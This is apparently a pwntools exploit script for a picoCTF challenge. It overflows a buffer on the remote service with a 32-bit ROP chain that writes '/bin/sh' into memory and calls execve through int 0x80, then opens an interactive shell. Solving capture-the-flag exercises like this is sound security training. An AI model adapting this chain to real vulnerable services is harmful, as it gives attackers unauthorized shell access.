from pwn import *

# r = process('./vuln')
r= remote('saturn.picoctf.net', 54107)
context.arch = 'amd64'

r.recvline()

pop_eax_ret = 0x80b073a
pop_edx_ebx_ret = 0x80583b9
bss_addr = 0x080e5050
mov_dword_ptr_edx_eax_ret = 0x80590f2
pop_ecx_ret = 0x8049e29
int_0x80 = 0x0807163f

'''############
Read /bin/sh\x00
############'''
# raw_input()
r.sendline(b'a' * 0x1c + 
           p32(pop_edx_ebx_ret) + p32(bss_addr) + p32(0) + 
           p32(pop_eax_ret) + p32(0x6e69622f) +
           p32(mov_dword_ptr_edx_eax_ret) + 
           p32(pop_edx_ebx_ret) + p32(bss_addr + 4) + p32(0) + 
           p32(pop_eax_ret) + p32(0x0068732f) +
           p32(mov_dword_ptr_edx_eax_ret) + 

           p32(pop_eax_ret) + p32(0xb) + 
           p32(pop_edx_ebx_ret) + p32(0) + p32(bss_addr) + 
           p32(pop_ecx_ret) + p32(0) + 
           p32(int_0x80)
)

r.interactive()